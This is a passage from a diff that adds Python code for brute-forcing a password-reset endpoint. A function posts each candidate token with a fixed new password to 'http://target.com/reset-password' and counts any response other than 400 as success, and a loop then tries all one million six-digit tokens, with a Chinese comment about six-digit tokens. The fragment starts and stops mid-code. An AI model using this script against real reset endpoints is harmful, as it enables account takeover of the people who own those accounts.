+    }
+    r = requests.post("http://target.com/reset-password",
+        data={"token": token, "new_password": "Test123!"},
+        headers=headers, timeout=10)
+    return r.status_code != 400
+
+# 如果Token是6位数字:
+for i in range(0, 1000000):
+    token = f"{i:06d}"
